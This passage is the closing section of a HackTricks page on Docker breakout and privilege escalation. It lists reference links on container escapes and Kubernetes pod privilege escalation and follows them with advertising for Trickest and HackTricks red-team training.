* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
